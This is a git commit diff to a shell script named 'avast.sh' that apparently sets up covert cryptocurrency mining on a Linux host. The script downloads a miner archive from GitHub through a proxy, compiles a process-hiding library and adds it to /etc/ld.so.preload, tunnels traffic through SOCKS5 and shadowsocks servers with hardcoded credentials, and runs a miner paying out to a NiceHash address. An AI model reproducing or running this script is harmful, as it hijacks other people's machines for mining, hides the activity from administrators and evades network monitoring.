a8375566bd4944a0ee6c19c8487d09f8e97daba3
renilo <88342640+renilo@users.noreply.github.com>
2022-04-04 19:01:16 +0700

    Update avast.sh

--- avast.sh
+++ avast.sh
@@ -4,6 +4,8 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
 
@@ -16,7 +18,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 44.202.124.0:1080
+socks5 = 52.203.46.122:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -44,13 +46,17 @@ echo " "
 
 chmod +x bezzHash
 
-ph add bezzHash
-
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+apt -y install shadowsocks-libev rng-tools
+
+ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+
+ph add bezzHash
 
 ./graftcp/graftcp ./bezzHash --url=ssl://3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
